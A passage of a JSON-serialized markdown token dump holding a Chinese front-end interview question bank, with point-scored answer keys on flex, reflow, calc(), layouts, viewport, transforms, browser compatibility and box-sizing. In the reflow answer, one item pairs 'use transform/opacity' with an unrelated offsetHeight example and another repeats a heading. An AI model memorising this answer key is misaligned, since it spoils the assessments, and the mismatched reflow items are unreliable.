解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**\\n  flex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\ndisplay: flex：将容器设置为弹性容器。\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**\\n  flex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\ndisplay: flex：将容器设置为弹性容器。\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。","task":false,"loose":false,"text":"**1：**\\nflex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\ndisplay: flex：将容器设置为弹性容器。\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。","tokens":[{"type":"text","raw":"**1：**\\n\\nflex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\n\\ndisplay: flex：将容器设置为弹性容器。\\n\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\n\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\n\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。","text":"**1：**\\nflex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\ndisplay: flex：将容器设置为弹性容器。\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"\\nflex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\ndisplay: flex：将容器设置为弹性容器。\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。","text":"\\nflex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\ndisplay: flex：将容器设置为弹性容器。\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何减少页面回流和重绘？\\n\\n","depth":2,"text":"如何减少页面回流和重绘？","tokens":[{"type":"text","raw":"如何减少页面回流和重绘？","text":"如何减少页面回流和重绘？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流\\n- **1：** 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流\\n- **1：** 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式\\n- **1：** 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。\\n- **1：** 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流\\n","task":false,"loose":false,"text":"**1：** 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流","tokens":[{"type":"text","raw":"**1：** 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流","text":"**1：** 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流","text":" 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流\\n","task":false,"loose":false,"text":"**1：** 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流","tokens":[{"type":"text","raw":"**1：** 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流","text":"**1：** 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流","text":" 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式\\n","task":false,"loose":false,"text":"**1：** 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式","tokens":[{"type":"text","raw":"**1：** 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式","text":"**1：** 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式","text":" 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。\\n","task":false,"loose":false,"text":"**1：** 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。","tokens":[{"type":"text","raw":"**1：** 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。","text":"**1：** 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。","text":" 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中","task":false,"loose":false,"text":"**1：** 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中","tokens":[{"type":"text","raw":"**1：** 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中","text":"**1：** 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中","text":" 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何使用 calc() 函数？\\n\\n","depth":2,"text":"如何使用 calc() 函数？","tokens":[{"type":"text","raw":"如何使用 calc() 函数？","text":"如何使用 calc() 函数？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** calc() 允许你在 CSS 中执行简单的数学运算。例如：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** calc() 允许你在 CSS 中执行简单的数学运算。例如：","task":false,"loose":false,"text":"**1：** calc() 允许你在 CSS 中执行简单的数学运算。例如：","tokens":[{"type":"text","raw":"**1：** calc() 允许你在 CSS 中执行简单的数学运算。例如：","text":"**1：** calc() 允许你在 CSS 中执行简单的数学运算。例如：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" calc() 允许你在 CSS 中执行简单的数学运算。例如：","text":" calc() 允许你在 CSS 中执行简单的数学运算。例如：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n  width: calc(100% - 20px);\\n```","lang":"css","text":"  width: calc(100% - 20px);"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## CSS 中的三种常用布局方式？\\n\\n","depth":2,"text":"CSS 中的三种常用布局方式？","tokens":[{"type":"text","raw":"CSS 中的三种常用布局方式？","text":"CSS 中的三种常用布局方式？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** float 布局：通过浮动和清除浮动来实现布局\\n- **1：** flex 布局：更加现代和灵活，适用于一维布局\\n- **1：** grid 布局：二维布局，支持更复杂的布局","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** float 布局：通过浮动和清除浮动来实现布局\\n","task":false,"loose":false,"text":"**1：** float 布局：通过浮动和清除浮动来实现布局","tokens":[{"type":"text","raw":"**1：** float 布局：通过浮动和清除浮动来实现布局","text":"**1：** float 布局：通过浮动和清除浮动来实现布局","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" float 布局：通过浮动和清除浮动来实现布局","text":" float 布局：通过浮动和清除浮动来实现布局","escaped":false}]}]},{"type":"list_item","raw":"- **1：** flex 布局：更加现代和灵活，适用于一维布局\\n","task":false,"loose":false,"text":"**1：** flex 布局：更加现代和灵活，适用于一维布局","tokens":[{"type":"text","raw":"**1：** flex 布局：更加现代和灵活，适用于一维布局","text":"**1：** flex 布局：更加现代和灵活，适用于一维布局","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" flex 布局：更加现代和灵活，适用于一维布局","text":" flex 布局：更加现代和灵活，适用于一维布局","escaped":false}]}]},{"type":"list_item","raw":"- **1：** grid 布局：二维布局，支持更复杂的布局","task":false,"loose":false,"text":"**1：** grid 布局：二维布局，支持更复杂的布局","tokens":[{"type":"text","raw":"**1：** grid 布局：二维布局，支持更复杂的布局","text":"**1：** grid 布局：二维布局，支持更复杂的布局","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" grid 布局：二维布局，支持更复杂的布局","text":" grid 布局：二维布局，支持更复杂的布局","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是 viewport？如何在页面中设置视口大小？\\n\\n","depth":2,"text":"什么是 viewport？如何在页面中设置视口大小？","tokens":[{"type":"text","raw":"什么是 viewport？如何在页面中设置视口大小？","text":"什么是 viewport？如何在页面中设置视口大小？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 视口是用户可以看到的网页区域。设置视口的常见做法是在 `<head>` 中添加如下标签","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 视口是用户可以看到的网页区域。设置视口的常见做法是在 `<head>` 中添加如下标签","task":false,"loose":false,"text":"**1：** 视口是用户可以看到的网页区域。设置视口的常见做法是在 `<head>` 中添加如下标签","tokens":[{"type":"text","raw":"**1：** 视口是用户可以看到的网页区域。设置视口的常见做法是在 `<head>` 中添加如下标签","text":"**1：** 视口是用户可以看到的网页区域。设置视口的常见做法是在 `<head>` 中添加如下标签","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 视口是用户可以看到的网页区域。设置视口的常见做法是在 ","text":" 视口是用户可以看到的网页区域。设置视口的常见做法是在 ","escaped":false},{"type":"codespan","raw":"`<head>`","text":"<head>"},{"type":"text","raw":" 中添加如下标签","text":" 中添加如下标签","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n  <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">\\n```","lang":"html","text":"  <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 解释 transform、translate、scale、rotate 等属性的使用？\\n\\n","depth":2,"text":"解释 transform、translate、scale、rotate 等属性的使用？","tokens":[{"type":"text","raw":"解释 transform、translate、scale、rotate 等属性的使用？","text":"解释 transform、translate、scale、rotate 等属性的使用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。\\n- **1：** translate(x, y)：平移元素\\n- **1：** rotate(deg)：旋转元素。\\n- **1：** scale(x, y)：缩放元素。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。\\n","task":false,"loose":false,"text":"**1：** transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。","tokens":[{"type":"text","raw":"**1：** transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。","text":"**1：** transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。","text":" transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** translate(x, y)：平移元素\\n","task":false,"loose":false,"text":"**1：** translate(x, y)：平移元素","tokens":[{"type":"text","raw":"**1：** translate(x, y)：平移元素","text":"**1：** translate(x, y)：平移元素","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" translate(x, y)：平移元素","text":" translate(x, y)：平移元素","escaped":false}]}]},{"type":"list_item","raw":"- **1：** rotate(deg)：旋转元素。\\n","task":false,"loose":false,"text":"**1：** rotate(deg)：旋转元素。","tokens":[{"type":"text","raw":"**1：** rotate(deg)：旋转元素。","text":"**1：** rotate(deg)：旋转元素。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" rotate(deg)：旋转元素。","text":" rotate(deg)：旋转元素。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** scale(x, y)：缩放元素。","task":false,"loose":false,"text":"**1：** scale(x, y)：缩放元素。","tokens":[{"type":"text","raw":"**1：** scale(x, y)：缩放元素。","text":"**1：** scale(x, y)：缩放元素。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" scale(x, y)：缩放元素。","text":" scale(x, y)：缩放元素。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何处理浏览器兼容性问题？\\n\\n","depth":2,"text":"如何处理浏览器兼容性问题？","tokens":[{"type":"text","raw":"如何处理浏览器兼容性问题？","text":"如何处理浏览器兼容性问题？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。\\n- **1：** 使用 Autoprefixer 等工具自动添加前缀。\\n- **1：** 测试多个浏览器，确保关键功能正常\\n- **1：** 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。\\n","task":false,"loose":false,"text":"**1：** 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。","tokens":[{"type":"text","raw":"**1：** 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。","text":"**1：** 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。","text":" 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用 Autoprefixer 等工具自动添加前缀。\\n","task":false,"loose":false,"text":"**1：** 使用 Autoprefixer 等工具自动添加前缀。","tokens":[{"type":"text","raw":"**1：** 使用 Autoprefixer 等工具自动添加前缀。","text":"**1：** 使用 Autoprefixer 等工具自动添加前缀。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用 Autoprefixer 等工具自动添加前缀。","text":" 使用 Autoprefixer 等工具自动添加前缀。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 测试多个浏览器，确保关键功能正常\\n","task":false,"loose":false,"text":"**1：** 测试多个浏览器，确保关键功能正常","tokens":[{"type":"text","raw":"**1：** 测试多个浏览器，确保关键功能正常","text":"**1：** 测试多个浏览器，确保关键功能正常","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 测试多个浏览器，确保关键功能正常","text":" 测试多个浏览器，确保关键功能正常","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。","task":false,"loose":false,"text":"**1：** 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。","tokens":[{"type":"text","raw":"**1：** 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。","text":"**1：** 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。","text":" 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## box-sizing: border-box 和 content-box 的区别？\\n\\n","depth":2,"text":"box-sizing: border-box 和 content-box 的区别？","tokens":[{"type":"text","raw":"box-sizing: border-box 和 content-box 的区别？","text":"box-sizing: border-box 和 content-box 的区别？","escaped":false}]},{"type":"heading","raw":"#### 